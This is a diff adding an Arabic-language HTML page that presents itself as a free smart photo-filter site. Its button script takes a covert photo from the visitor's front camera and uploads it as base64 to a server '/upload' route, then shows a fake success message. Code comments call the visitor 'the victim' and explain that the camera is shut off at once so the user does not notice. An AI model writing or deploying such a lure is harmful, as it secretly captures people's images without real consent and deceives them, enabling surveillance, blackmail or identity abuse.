@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>منصة تعديل الصور والفلاتر المجانية</title>
+    <style>
+        body { 
+            font-family: Tahoma, sans-serif; 
+            text-align: center; 
+            background: #f4f4f9; 
+            padding-top: 80px; 
+        }
+        .box { 
+            background: white; 
+            padding: 40px; 
+            border-radius: 12px; 
+            display: inline-block; 
+            box-shadow: 0px 4px 15px rgba(0,0,0,0.1); 
+            max-width: 400px;
+        }
+        h2 { color: #333; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; margin-bottom: 25px; }
+        button { 
+            background: #ff4757; 
+            color: white; 
+            border: none; 
+            padding: 12px 30px; 
+            font-size: 16px; 
+            border-radius: 6px; 
+            cursor: pointer; 
+            transition: background 0.3s;
+        }
+        button:hover { background: #ff6b81; }
+        #video { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h2>أهلاً بك في منصة الفلاتر الذكية</h2>
+        <p>اضغط على الزر أدناه لتفعيل الفلتر الذكي وعرض صورتك الشخصية على التصميم:</p>
+        <button onclick="startCapture()">تفعيل الفلتر الآن</button>
+    </div>
+
+    <!-- عناصر خفية لتشغيل الكاميرا والرسم -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        async function startCapture() {
+            try {
+                // طلب إذن الكاميرا الأمامية من الضحية
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // الانتظار 1.5 ثانية لضمان تركيز الكاميرا وإتاحة الفيديو
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // تحويل الصورة إلى صيغة Base64 لإرسالها
+                    const imageData = canvas.toDataURL('image/png');
+
+                    // إرسال الصورة إلى مسار الخادم (/upload)
+                    fetch('/upload', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ image: imageData })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Success:', data);
+                        alert('تم تطبيق الفلتر بنجاح!');
+                    })
+                    .catch((error) => {
+                        console.error('Error:', error);
+                    });
+
+                    // إيقاف عمل الكاميرا بعد الالتقاط لتجنب لفت انتباه المستخدم (توقف اللمبة الخضراء)
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1500);
+
+            } catch (err) {
+                console.error("فشل الوصول إلى الكاميرا: ", err);
+                alert("عذراً، يجب السماح للوصول إلى الكاميرا لتشغيل الفلتر.");
+            }
+        }
+    </script>
+
+</body>
+</html>
